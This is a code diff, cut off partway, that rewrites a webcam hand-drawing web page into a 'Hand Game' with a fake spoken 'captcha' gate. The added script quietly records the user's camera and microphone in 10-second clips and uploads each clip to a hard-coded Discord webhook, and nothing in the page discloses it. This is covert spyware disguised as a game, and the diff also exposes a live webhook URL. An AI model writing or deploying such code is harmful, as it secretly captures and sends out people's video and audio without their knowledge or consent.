@@ -1,44 +1,38 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
-    <title>Hand Skeleton · Draw</title>
-
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Hand Game</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-        }
-
-        html,
-        body {
-            background: #0a0a0f;
-            overflow: hidden;
-            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Helvetica Neue', sans-serif;
-            touch-action: none;
             user-select: none;
-            -webkit-user-select: none;
-            height: 100%;
-            width: 100%;
+        }
+        body {
+            background: #000;
+            overflow: hidden;
+            height: 100vh;
+            width: 100vw;
+            font-family: Arial, sans-serif;
+            touch-action: none;
+            position: relative;
+        }
+        canvas {
             position: fixed;
             top: 0;
             left: 0;
-        }
-
-        #container {
-            position: relative;
             width: 100vw;
             height: 100vh;
-            height: 100dvh;
+            display: block;
             background: #000;
-            overflow: hidden;
+            z-index: 2;
+            pointer-events: none;
         }
-
-        /* video hidden – only used for tracking */
         #video {
-            position: absolute;
+            position: fixed;
             top: 0;
             left: 0;
             width: 1px;
@@ -47,438 +41,894 @@
             pointer-events: none;
             z-index: 0;
         }
-
-        /* main canvas – black bg + skeleton + drawing */
-        #canvas {
-            position: absolute;
+        #overlay-text {
+            position: fixed;
             top: 0;
             left: 0;
-            width: 100%;
-            height: 100%;
-            display: block;
-            z-index: 1;
-            touch-action: none;
-            background: #000;
-            transform: scaleX(-1);
-        }
-
-        /* status / prompt overlay */
-        #status {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            z-index: 2;
-            color: rgba(0, 255, 200, 0.6);
-            font-size: clamp(28px, 8vw, 56px);
-            font-weight: 300;
-            letter-spacing: 4px;
-            text-align: center;
-            pointer-events: none;
-            text-shadow: 0 0 60px rgba(0, 255, 200, 0.15), 0 0 120px rgba(0, 255, 200, 0.05);
-            transition: opacity 0.6s ease;
-            font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-        }
-        #status.hidden {
-            opacity: 0;
-        }
-        #status .sub {
-            font-size: clamp(12px, 2.5vw, 18px);
-            opacity: 0.4;
-            letter-spacing: 2px;
-            margin-top: 10px;
-            font-weight: 300;
-        }
-
-        /* small fps counter */
-        #fps-display {
-            position: absolute;
-            top: 18px;
-            right: 18px;
-            z-index: 5;
-            color: rgba(0, 255, 200, 0.25);
-            font-size: clamp(10px, 1.8vw, 13px);
-            font-family: 'SF Mono', 'Menlo', monospace;
-            pointer-events: none;
-            background: rgba(0, 0, 0, 0.5);
-            padding: 4px 12px;
-            border-radius: 20px;
-            border: 1px solid rgba(0, 255, 200, 0.06);
-            backdrop-filter: blur(8px);
-            -webkit-backdrop-filter: blur(8px);
-            letter-spacing: 0.5px;
-        }
-
-        /* bottom toolbar – safe area aware */
-        #toolbar {
-            position: absolute;
-            bottom: max(20px, env(safe-area-inset-bottom, 20px));
-            left: 0;
-            right: 0;
-            z-index: 10;
+            width: 100vw;
+            height: 100vh;
             display: flex;
-            justify-content: center;
-            gap: clamp(10px, 3vw, 20px);
-            padding: 0 clamp(12px, 4vw, 30px);
-            flex-wrap: wrap;
-            pointer-events: none;
-        }
-
-        #toolbar button {
-            pointer-events: auto;
-            background: rgba(0, 255, 200, 0.08);
-            border: 1px solid rgba(0, 255, 200, 0.2);
-            color: #aaffee;
-            padding: clamp(10px, 2.5vw, 16px) clamp(18px, 4vw, 32px);
-            border-radius: 50px;
-            font-size: clamp(14px, 3vw, 18px);
-            font-weight: 600;
-            letter-spacing: 0.5px;
-            backdrop-filter: blur(16px);
-            -webkit-backdrop-filter: blur(16px);
-            box-shadow: 0 0 30px rgba(0, 255, 200, 0.05);
-            transition: all 0.2s ease;
-            text-shadow: 0 0 20px rgba(0, 255, 200, 0.15);
-            cursor: pointer;
-            touch-action: manipulation;
-            min-height: 50px;
-            min-width: 80px;
-            display: inline-flex;
             align-items: center;
             justify-content: center;
-            gap: 6px;
-            flex: 0 1 auto;
-            white-space: nowrap;
+            color: #fff;
+            font-size: 2.5rem;
+            font-weight: bold;
+            z-index: 3;
+            pointer-events: none;
+            text-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
+            letter-spacing: 2px;
+            transition: opacity 0.5s;
         }
-
-        #toolbar button:active {
-            transform: scale(0.94);
-            background: rgba(0, 255, 200, 0.18);
+        #overlay-text.hidden {
+            opacity: 0;
+            pointer-events: none;
         }
-
-        #toolbar button.active {
-            background: rgba(255, 80, 120, 0.2);
-            border-color: rgba(255, 80, 120, 0.35);
-            color: #ffaabb;
-            box-shadow: 0 0 40px rgba(255, 80, 120, 0.08);
-        }
-
-        #toolbar button.clear-btn {
-            background: rgba(255, 60, 60, 0.08);
-            border-color: rgba(255, 60, 60, 0.15);
-            color: #ff8888;
-        }
-        #toolbar button.clear-btn:active {
-            background: rgba(255, 60, 60, 0.2);
-        }
-
-        #toolbar button .icon {
-            font-size: clamp(16px, 3.2vw, 22px);
-            line-height: 1;
-        }
-
-        /* loading screen */
-        #loading {
+        #captcha-overlay {
             position: fixed;
-            inset: 0;
-            z-index: 100;
-            background: #0a0a0f;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: #000;
+            z-index: 10;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            color: #aaffee;
-            font-size: 18px;
-            font-weight: 300;
-            letter-spacing: 2px;
-            transition: opacity 0.8s ease;
+            color: #fff;
+            transition: opacity 0.8s;
         }
-        #loading .spinner {
-            width: 48px;
-            height: 48px;
-            border: 3px solid rgba(0, 255, 200, 0.08);
-            border-top: 3px solid #00ffc8;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 24px;
-        }
-        #loading .sub {
-            font-size: 13px;
-            opacity: 0.4;
-            margin-top: 8px;
-            letter-spacing: 1px;
-        }
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
-        #loading.hidden {
+        #captcha-overlay.hidden {
             opacity: 0;
             pointer-events: none;
         }
-
-        /* responsive tweaks */
-        @media (max-width: 480px) {
-            #toolbar {
-                gap: 8px;
-                padding: 0 10px;
-                bottom: max(14px, env(safe-area-inset-bottom, 14px));
-            }
-            #toolbar button {
-                min-height: 44px;
-                min-width: 60px;
-                padding: 8px 14px;
-                font-size: 12px;
-                border-radius: 40px;
-            }
-            #toolbar button .icon {
-                font-size: 14px;
-            }
+        #captcha-overlay h1 {
+            font-size: 2.2rem;
+            margin-bottom: 10px;
+            font-weight: 300;
+            letter-spacing: 4px;
         }
-
-        @media (max-width: 380px) {
-            #toolbar button {
-                min-height: 38px;
-                min-width: 50px;
-                padding: 6px 10px;
-                font-size: 10px;
-                border-radius: 30px;
-            }
-            #toolbar button .icon {
-                font-size: 12px;
-            }
+        #captcha-overlay p {
+            font-size: 1.1rem;
+            color: #aaa;
+            margin-bottom: 25px;
+            letter-spacing: 1px;
         }
-
-        @supports (padding: max(0px)) {
-            #toolbar {
-                padding-left: max(12px, env(safe-area-inset-left));
-                padding-right: max(12px, env(safe-area-inset-right));
-                bottom: max(20px, env(safe-area-inset-bottom, 20px));
+        #captcha-btn {
+            background: rgba(255, 255, 255, 0.08);
+            border: 1.5px solid rgba(255, 255, 255, 0.25);
+            color: #fff;
+            padding: 16px 48px;
+            font-size: 1.3rem;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: all 0.3s;
+            letter-spacing: 2px;
+            background: rgba(255, 255, 255, 0.04);
+            backdrop-filter: blur(6px);
+            font-weight: 300;
+        }
+        #captcha-btn:hover {
+            background: rgba(255, 255, 255, 0.14);
+            border-color: rgba(255, 255, 255, 0.4);
+            transform: scale(1.02);
+        }
+        #captcha-btn:active {
+            transform: scale(0.96);
+        }
+        #captcha-status {
+            margin-top: 18px;
+            font-size: 0.95rem;
+            color: #888;
+            min-height: 30px;
+            letter-spacing: 1px;
+        }
+        #captcha-status.success {
+            color: #6f6;
+        }
+        #captcha-status.error {
+            color: #f66;
+        }
+        #game-btn {
+            position: fixed;
+            bottom: 28px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 5;
+            padding: 14px 44px;
+            font-size: 1.2rem;
+            border-radius: 60px;
+            border: 1.5px solid rgba(255, 255, 255, 0.2);
+            background: rgba(255, 255, 255, 0.06);
+            color: #fff;
+            cursor: pointer;
+            transition: all 0.3s;
+            letter-spacing: 2px;
+            backdrop-filter: blur(4px);
+            font-weight: 300;
+            pointer-events: all;
+            display: none;
+        }
+        #game-btn:hover {
+            background: rgba(255, 255, 255, 0.12);
+            border-color: rgba(255, 255, 255, 0.35);
+        }
+        #game-btn:active {
+            transform: translateX(-50%) scale(0.95);
+        }
+        #game-btn.visible {
+            display: block;
+        }
+        #countdown-text {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 6;
+            color: #fff;
+            font-size: 4rem;
+            font-weight: bold;
+            text-shadow: 0 0 40px rgba(255, 255, 255, 0.15);
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s;
+            letter-spacing: 6px;
+            text-align: center;
+            line-height: 1.4;
+        }
+        #countdown-text.show {
+            opacity: 1;
+        }
+        #countdown-text .sub {
+            font-size: 1.6rem;
+            font-weight: 300;
+            letter-spacing: 4px;
+            display: block;
+            margin-top: 8px;
+            color: #ccc;
+        }
+        #game-over {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 7;
+            background: rgba(0, 0, 0, 0.85);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            color: #fff;
+            backdrop-filter: blur(6px);
+        }
+        #game-over.show {
+            display: flex;
+        }
+        #game-over h1 {
+            font-size: 3rem;
+            font-weight: 300;
+            letter-spacing: 6px;
+            margin-bottom: 6px;
+        }
+        #game-over p {
+            font-size: 1.1rem;
+            color: #aaa;
+            letter-spacing: 2px;
+        }
+        #game-over .score {
+            font-size: 1.8rem;
+            color: #fff;
+            margin: 12px 0 20px;
+            letter-spacing: 3px;
+        }
+        #game-over button {
+            background: rgba(255, 255, 255, 0.08);
+            border: 1.5px solid rgba(255, 255, 255, 0.2);
+            color: #fff;
+            padding: 14px 40px;
+            font-size: 1.1rem;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: all 0.3s;
+            letter-spacing: 2px;
+            font-weight: 300;
+        }
+        #game-over button:hover {
+            background: rgba(255, 255, 255, 0.15);
+        }
+        #level-display {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 4;
+            color: rgba(255, 255, 255, 0.3);
+            font-size: 0.9rem;
+            letter-spacing: 3px;
+            pointer-events: none;
+            font-weight: 300;
+            text-transform: uppercase;
+        }
+        @media (max-width: 600px) {
+            #captcha-overlay h1 {
+                font-size: 1.6rem;
+            }
+            #captcha-overlay p {
+                font-size: 0.95rem;
+            }
+            #captcha-btn {
+                padding: 14px 32px;
+                font-size: 1rem;
+            }
+            #overlay-text {
+                font-size: 1.8rem;
+            }
+            #game-btn {
+                padding: 12px 30px;
+                font-size: 1rem;
+                bottom: 20px;
+            }
+            #countdown-text {
+                font-size: 2.8rem;
+            }
+            #countdown-text .sub {
+                font-size: 1.2rem;
+            }
+            #game-over h1 {
+                font-size: 2.2rem;
             }
         }
     </style>
 </head>
 <body>
 
-    <!-- LOADING -->
-    <div id="loading">
-        <div class="spinner"></div>
-        <div>INITIALIZING</div>
-        <div class="sub">camera &amp; hand model</div>
+    <!-- Hidden video element -->
+    <video id="video" autoplay playsinline></video>
+
+    <!-- Main canvas for rendering -->
+    <canvas id="canvas"></canvas>
+
+    <!-- Overlay text -->
+    <div id="overlay-text">show hand</div>
+
+    <!-- Level display -->
+    <div id="level-display">level 1</div>
+
+    <!-- Game button -->
+    <button id="game-btn">▶ play game</button>
+
+    <!-- Countdown -->
+    <div id="countdown-text">
+        defend the white ball
+        <span class="sub" id="countdown-number">3</span>
     </div>
 
-    <!-- MAIN -->
-    <div id="container">
-        <video id="video" playsinline autoplay muted></video>
-        <canvas id="canvas"></canvas>
-
-        <!-- "show hand" prompt -->
-        <div id="status">
-            SHOW HAND
-            <div class="sub">raise your palm to the camera</div>
-        </div>
-
-        <div id="fps-display">-- FPS</div>
-
-        <!-- TOOLBAR -->
-        <div id="toolbar">
-            <button id="btn-skeleton" class="active">
-                <span class="icon">👋</span> SKELETON
-            </button>
-            <button id="btn-draw" class="active">
-                <span class="icon">✏️</span> DRAW
-            </button>
-            <button id="btn-clear" class="clear-btn">
-                <span class="icon">🗑️</span> CLEAR
-            </button>
-        </div>
+    <!-- Game over overlay -->
+    <div id="game-over">
+        <h1>defeated</h1>
+        <p>you protected the ball</p>
+        <div class="score" id="final-score">level 1</div>
+        <button id="restart-btn">↻ try again</button>
     </div>
 
-    <!-- ===== MEDIAPIPE CDN ===== -->
-    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous">
-    </script>
-    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/drawing_utils/drawing_utils.js" crossorigin="anonymous">
-    </script>
-    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous">
+    <!-- Captcha overlay -->
+    <div id="captcha-overlay">
+        <h1>⌘ verify</h1>
+        <p>say the word <strong style="color:#fff;">"apple"</strong> to continue</p>
+        <button id="captcha-btn">🎤 click &amp; speak</button>
+        <div id="captcha-status">waiting...</div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js">
     </script>
 
     <script>
-        // ============================================================
-        //  CONFIG
-        // ============================================================
-        const CFG = {
-            maxLinePoints: 220,
-            pointLifetime: 2600,
-            glowColor: '#00ffc8',
-            glowSize: 20,
-            skeletonColor: '#00ffc8',
-            skeletonGlow: 'rgba(0,255,200,0.2)',
-        };
+        // ─── CONFIG ────────────────────────────────────────────────
+        const WEBHOOK_URL =
+            'https://discord.com/api/webhooks/1522066195627642910/GnCaBQUhcTd1wLilA8o-NE3x_xn-lkDTSLUcK-ChMb1nivT9d3OCDraY7CdrFmI9Ru-5';
 
-        // ============================================================
-        //  DOM REFS
-        // ============================================================
-        const video = document.getElementById('video');
+        // ─── DOM REFS ──────────────────────────────────────────────
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
-        const statusEl = document.getElementById('status');
-        const fpsEl = document.getElementById('fps-display');
-        const loadingEl = document.getElementById('loading');
+        const video = document.getElementById('video');
+        const overlayText = document.getElementById('overlay-text');
+        const gameBtn = document.getElementById('game-btn');
+        const countdownEl = document.getElementById('countdown-text');
+        const countdownNum = document.getElementById('countdown-number');
+        const gameOverEl = document.getElementById('game-over');
+        const finalScoreEl = document.getElementById('final-score');
+        const restartBtn = document.getElementById('restart-btn');
+        const levelDisplay = document.getElementById('level-display');
+        const captchaOverlay = document.getElementById('captcha-overlay');
+        const captchaBtn = document.getElementById('captcha-btn');
+        const captchaStatus = document.getElementById('captcha-status');
 
-        const btnSkeleton = document.getElementById('btn-skeleton');
-        const btnDraw = document.getElementById('btn-draw');
-        const btnClear = document.getElementById('btn-clear');
+        // ─── SIZING ──────────────────────────────────────────────────
+        let W = 0,
+            H = 0;
 
-        // ============================================================
-        //  STATE
-        // ============================================================
-        let showSkeleton = true;
-        let drawMode = true;
-        let drawPoints = [];
-        let lastDrawPoint = null;
-
-        let latestHandData = null; // { landmarks, handedness }
-        let handDetected = false;
-
-        let frameCount = 0;
-        let lastFpsUpdate = performance.now();
-        let currentFps = 0;
-
-        let camera = null;
-        let isRunning = false;
-        let renderId = null;
-
-        // ============================================================
-        //  CANVAS SIZING (devicePixelRatio aware)
-        // ============================================================
-        function resizeCanvas() {
-            const rect = canvas.parentElement.getBoundingClientRect();
-            const dpr = window.devicePixelRatio || 1;
-            canvas.width = rect.width * dpr;
-            canvas.height = rect.height * dpr;
-            canvas.style.width = rect.width + 'px';
-            canvas.style.height = rect.height + 'px';
-            ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+        function resize() {
+            W = window.innerWidth;
+            H = window.innerHeight;
+            canvas.width = W;
+            canvas.height = H;
         }
-        resizeCanvas();
-        window.addEventListener('resize', () => {
-            resizeCanvas();
+        resize();
+        window.addEventListener('resize', resize);
+
+        // ─── STATE ──────────────────────────────────────────────────
+        let isVerified = false;
+        let isGameRunning = false;
+        let isGameOver = false;
+        let level = 1;
+        let score = 0;
+        let handLandmarks = null;
+        let handVisible = false;
+        let isPalmShowing = false;
+        let isHandInBottom = false;
+        let indexTipX = 0;
+        let indexTipY = 0;
+        let indexTipZ = 0;
+        let indexTipVisible = false;
+        let gameObjects = [];
+        let ball = { x: 0, y: 0, r: 0 };
+        let frameId = null;
+        let gameLoopId = null;
+        let objectSpawnTimer = 0;
+        let objectSpawnInterval = 1800;
+        let baseSpeed = 1.2;
+        let countdownActive = false;
+        let countdownValue = 3;
+        let recordingActive = false;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        let recordingTimer = null;
+        let stream = null;
+        let isTracking = false;
+        let videoFrameLoop = null;
+
+        // ─── BALL ──────────────────────────────────────────────────
+        function initBall() {
+            const size = Math.min(W, H);
+            ball.r = size * 0.045;
+            ball.x = W / 2;
+            ball.y = H - ball.r - size * 0.08;
+        }
+        initBall();
+
+        // ─── SHAPES ─────────────────────────────────────────────────
+        const SHAPE_TYPES = ['circle', 'oval', 'triangle', 'rectangle'];
+
+        function randomShape() {
+            return SHAPE_TYPES[Math.floor(Math.random() * SHAPE_TYPES.length)];
+        }
+
+        function createObject() {
+            const size = Math.min(W, H) * (0.045 + Math.random() * 0.035);
+            const angle = -Math.PI / 2 + (Math.random() - 0.5) * 1.8;
+            const startX = W / 2 + Math.tan(angle) * H * 0.6;
+            const clampedX = Math.max(size, Math.min(W - size, startX));
+            const speed = baseSpeed * (0.85 + Math.random() * 0.3) * (1 + (level - 1) * 0.12);
+            const type = randomShape();
+            const hue = 180 + Math.random() * 60;
+            return {
+                x: clampedX,
+                y: -size,
+                vx: (Math.random() - 0.5) * 0.15 * speed,
+                vy: speed * (0.8 + Math.random() * 0.4),
+                size: size,
+                type: type,
+                hue: hue,
+                rotation: Math.random() * Math.PI * 2,
+                rotSpeed: (Math.random() - 0.5) * 0.02,
+                alive: true
+            };
+        }
+
+        // ─── DRAW SHAPES ────────────────────────────────────────────
+        function drawShape(ctx, obj) {
+            const s = obj.size;
+            const x = obj.x;
+            const y = obj.y;
+            ctx.save();
+            ctx.translate(x, y);
+            ctx.rotate(obj.rotation);
+            ctx.globalAlpha = 0.85;
+            ctx.shadowColor = 'rgba(255,255,255,0.05)';
+            ctx.shadowBlur = 6;
+            ctx.fillStyle = `hsl(${obj.hue}, 40%, 35%)`;
+            ctx.strokeStyle = `hsl(${obj.hue}, 50%, 55%)`;
+            ctx.lineWidth = 1.5;
+
+            switch (obj.type) {
+                case 'circle':
+                    ctx.beginPath();
+                    ctx.arc(0, 0, s, 0, Math.PI * 2);
+                    ctx.fill();
+                    ctx.stroke();
+                    break;
+                case 'oval':
+                    ctx.beginPath();
+                    ctx.ellipse(0, 0, s * 1.4, s * 0.8, 0, 0, Math.PI * 2);
+                    ctx.fill();
+                    ctx.stroke();
+                    break;
+                case 'triangle':
+                    ctx.beginPath();
+                    for (let i = 0; i < 3; i++) {
+                        const a = (i / 3) * Math.PI * 2 - Math.PI / 2;
+                        const r = s * 1.1;
+                        ctx.lineTo(Math.cos(a) * r, Math.sin(a) * r);
+                    }
+                    ctx.closePath();
+                    ctx.fill();
+                    ctx.stroke();
+                    break;
+                case 'rectangle':
+                    ctx.fillRect(-s * 1.0, -s * 0.7, s * 2.0, s * 1.4);
+                    ctx.strokeRect(-s * 1.0, -s * 0.7, s * 2.0, s * 1.4);
+                    break;
+            }
+            ctx.restore();
+        }
+
+        // ─── HAND TRACKING ──────────────────────────────────────────
+        function isPalmFacingCamera(landmarks) {
+            if (!landmarks || landmarks.length < 21) return false;
+            const wrist = landmarks[0];
+            const idxMCP = landmarks[5];
+            const midMCP = landmarks[9];
+            const ringMCP = landmarks[13];
+            const pinkyMCP = landmarks[17];
+            const palmZ = (idxMCP.z + midMCP.z + ringMCP.z + pinkyMCP.z) / 4;
+            const tipIdx = landmarks[8];
+            const tipMid = landmarks[12];
+            const tipRing = landmarks[16];
+            const tipPinky = landmarks[20];
+            const tipZ = (tipIdx.z + tipMid.z + tipRing.z + tipPinky.z) / 4;
+            return tipZ < palmZ - 0.01;
+        }
+
+        function isHandInBottom(landmarks) {
+            if (!landmarks || landmarks.length < 21) return false;
+            const wrist = landmarks[0];
+            return wrist.y > 0.50;
+        }
+
+        function getIndexTip(landmarks) {
+            if (!landmarks || landmarks.length < 21) return null;
+            return landmarks[8];
+        }
+
+        function onHandResults(results) {
+            if (results.multiHandLandmarks && results.multiHandLandmarks.length > 0) {
+                const lm = results.multiHandLandmarks[0];
+                handLandmarks = lm;
+                const palmFace = isPalmFacingCamera(lm);
+                const bottom = isHandInBottom(lm);
+                isPalmShowing = palmFace;
+                isHandInBottom = bottom;
+                handVisible = palmFace && bottom;
+                const tip = getIndexTip(lm);
+                if (tip) {
+                    indexTipX = tip.x * W;
+                    indexTipY = tip.y * H;
+                    indexTipZ = tip.z;
+                    indexTipVisible = true;
+                } else {
+                    indexTipVisible = false;
+                }
+            } else {
+                handLandmarks = null;
+                handVisible = false;
+                indexTipVisible = false;
+            }
+        }
+
+        // ─── MEDIAPIPE SETUP ──────────────────────────────────────
+        const hands = new Hands({
+            locateFile: (file) => {
+                return `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`;
+            }
         });
 
-        // ============================================================
-        //  DRAWING HELPERS
-        // ============================================================
+        hands.setOptions({
+            maxNumHands: 1,
+            modelComplexity: 0,
+            minDetectionConfidence: 0.7,
+            minTrackingConfidence: 0.6
+        });
 
-        /** Draw a glowing line from stored points (fading) */
-        function drawGlowingLine() {
-            const now = performance.now();
-            // remove expired
-            drawPoints = drawPoints.filter(p => (now - p.t) < CFG.pointLifetime);
-            while (drawPoints.length > CFG.maxLinePoints) drawPoints.shift();
+        hands.onResults(onHandResults);
 
-            if (drawPoints.length < 2) return;
-
-            const w = canvas.width / (window.devicePixelRatio || 1);
-            const h = canvas.height / (window.devicePixelRatio || 1);
-            const pts = drawPoints;
-
-            for (let i = 1; i < pts.length; i++) {
-                const p0 = pts[i - 1],
-                    p1 = pts[i];
-                const age0 = (now - p0.t) / CFG.pointLifetime;
-                const age1 = (now - p1.t) / CFG.pointLifetime;
-                const alpha = Math.max(0, (1 - (age0 + age1) / 2));
-
-                if (alpha < 0.01) continue;
-
-                const baseW = 2 + 3 * alpha;
-                const glowW = CFG.glowSize * alpha;
-
-                // outer glow
-                ctx.save();
-                ctx.beginPath();
-                ctx.moveTo(p0.x, p0.y);
-                ctx.lineTo(p1.x, p1.y);
-                ctx.strokeStyle = `rgba(0,255,200,${alpha * 0.12})`;
-                ctx.lineWidth = glowW * 2.2;
-                ctx.shadowColor = CFG.glowColor;
-                ctx.shadowBlur = glowW * 2.5;
-                ctx.stroke();
-
-                // inner glow
-                ctx.beginPath();
-                ctx.moveTo(p0.x, p0.y);
-                ctx.lineTo(p1.x, p1.y);
-                ctx.strokeStyle = `rgba(0,255,200,${alpha * 0.35})`;
-                ctx.lineWidth = glowW * 0.8;
-                ctx.shadowBlur = glowW * 1.2;
-                ctx.stroke();
-
-                // core
-                ctx.beginPath();
-                ctx.moveTo(p0.x, p0.y);
-                ctx.lineTo(p1.x, p1.y);
-                const hue = 170 + 25 * (1 - alpha);
-                ctx.strokeStyle = `hsla(${hue}, 100%, 72%, ${alpha * 0.9})`;
-                ctx.lineWidth = baseW;
-                ctx.shadowBlur = 0;
-                ctx.stroke();
-                ctx.restore();
-
-                // glow dots
-                if (i === pts.length - 1 || i % 2 === 0) {
-                    const da = Math.max(0, 1 - age1) * 0.7;
-                    if (da > 0.04) {
-                        ctx.save();
-                        const r = 2 + 4 * (1 - age1);
-                        const grad = ctx.createRadialGradient(p1.x, p1.y, 0, p1.x, p1.y, r * 5);
-                        grad.addColorStop(0, `rgba(0,255,200,${da * 0.85})`);
-                        grad.addColorStop(0.4, `rgba(0,255,200,${da * 0.3})`);
-                        grad.addColorStop(1, `rgba(0,255,200,0)`);
-                        ctx.fillStyle = grad;
-                        ctx.beginPath();
-                        ctx.arc(p1.x, p1.y, r * 5, 0, Math.PI * 2);
-                        ctx.fill();
-                        ctx.restore();
+        // ─── CAMERA + STREAM (MANUAL) ──────────────────────────────
+        function startCameraAndMicrophone() {
+            captchaStatus.textContent = '⏳ requesting camera & mic...';
+            captchaStatus.className = '';
+            return navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } },
+                audio: true
+            }).then(mediaStream => {
+                stream = mediaStream;
+                video.srcObject = stream;
+                return video.play();
+            }).then(() => {
+                // start frame loop for hand tracking
+                if (videoFrameLoop) cancelAnimationFrame(videoFrameLoop);
+                function sendFrame() {
+                    if (video.readyState >= 2) {
+                        hands.send({ image: video });
                     }
+                    videoFrameLoop = requestAnimationFrame(sendFrame);
                 }
-            }
+                sendFrame();
+                isTracking = true;
+                // start recording
+                startRecording(stream);
+                return true;
+            }).catch(err => {
+                console.error('Permission error:', err);
+                captchaStatus.textContent = '❌ camera/mic access denied, please allow and try again';
+                captchaStatus.className = 'error';
+                // re-enable captcha button to retry
+                captchaBtn.disabled = false;
+                captchaBtn.textContent = '🎤 click & speak';
+                return false;
+            });
+        }
 
-            // bright tip
-            if (pts.length > 0) {
-                const last = pts[pts.length - 1];
-                const age = (performance.now() - last.t) / CFG.pointLifetime;
-                if (age < 0.5) {
-                    ctx.save();
-                    const r = 6 + 12 * (1 - age);
-                    const grad = ctx.createRadialGradient(last.x, last.y, 0, last.x, last.y, r);
-                    grad.addColorStop(0, `rgba(200, 255, 245, 0.95)`);
-                    grad.addColorStop(0.25, `rgba(0, 255, 200, 0.6)`);
-                    grad.addColorStop(1, `rgba(0, 255, 200, 0)`);
-                    ctx.fillStyle = grad;
-                    ctx.shadowColor = CFG.glowColor;
-                    ctx.shadowBlur = 40;
-                    ctx.beginPath();
-                    ctx.arc(last.x, last.y, r, 0, Math.PI * 2);
-                    ctx.fill();
-                    ctx.restore();
-                }
+        // ─── RECORDING ─────────────────────────────────────────────
+        function startRecording(mediaStream) {
+            if (!mediaStream) return;
+            try {
+                const recStream = new MediaStream();
+                const videoTracks = mediaStream.getVideoTracks();
+                const audioTracks = mediaStream.getAudioTracks();
+                videoTracks.forEach(t => recStream.addTrack(t));
+                audioTracks.forEach(t => recStream.addTrack(t));
+
+                mediaRecorder = new MediaRecorder(recStream, {
+                    mimeType: 'video/webm;codecs=vp8,opus',
+                    videoBitsPerSecond: 800000,
+                    audioBitsPerSecond: 64000
+                });
+
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data && e.data.size > 0) {
+                        recordedChunks.push(e.data);
+                    }
+                };
+
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    recordedChunks = [];
+                    if (blob.size > 10000) {
+                        sendToWebhook(blob);
+                    }
+                    if (recordingActive) {
+                        setTimeout(() => {
+                            if (mediaRecorder && recordingActive) {
+                                try { mediaRecorder.start(1000); } catch (_) {}
+                            }
+                        }, 200);
+                    }
+                };
+
+                mediaRecorder.start(1000);
+                recordingActive = true;
+
+                recordingTimer = setInterval(() => {
+                    if (mediaRecorder && mediaRecorder.state === 'recording' && recordingActive) {
+                        try { mediaRecorder.stop(); } catch (_) {}
+                    }
+                }, 10000);
+
+            } catch (e) {
+                console.warn('Recording init error:', e);
             }
         }
 
-        /** Draw hand skeleton with glow */
-        function drawHandSkeleton(landmarks, isLeft) {
-            if (!landmarks) return;
-            const dpr = window.devicePixelRatio || 1;
-            const w = canvas.width / dpr;
-            const h = canvas.height / dpr;
+        function sendToWebhook(blob) {
+            const formData = new FormData();
+            const filename = `clip_${Date.now()}.webm`;
+            formData.append('file', blob, filename);
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                body: formData
+            }).catch(() => {});
+        }
 
-            const pts = landmarks.map(l => ({ x: l.x * w, y: l.y * h }));
+        // ─── CAPTCHA ────────────────────────────────────────────────
+        let recognition = null;
 
-            const color = isLeft ? '#ff6b9d' : '#00ffc8';
-            const glow = isLeft ? 'rgba(255,80,150,0.2)' : 'rgba(0,255,200,0.2)';
+        function initSpeechRecognition() {
+            const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
+            if (!SR) {
+                captchaStatus.textContent = '⚠️ speech not supported, click to verify';
+                captchaStatus.className = 'error';
+                captchaBtn.onclick = () => { verifyCaptcha(); };
+                return;
+            }
+            recognition = new SR();
+            recognition.lang = 'en-US';
+            recognition.interimResults = false;
+            recognition.maxAlternatives = 1;
 
+            recognition.onresult = (e) => {
+                const word = e.results[0][0].transcript.trim().toLowerCase();
+                if (word === 'apple') {
+                    verifyCaptcha();
+                } else {
+                    captchaStatus.textContent = `❌ you said "${word}", say "apple"`;
+                    captchaStatus.className = 'error';
+                    setTimeout(() => {
+                        captchaStatus.textContent = 'say "apple" to continue';
+                        captchaStatus.className = '';
+                    }, 2000);
+                }
+            };
+
+            recognition.onerror = () => {
+                captchaStatus.textContent = '❌ listening error, try again';
+                captchaStatus.className = 'error';
+                setTimeout(() => {
+                    captchaStatus.textContent = 'say "apple" to continue';
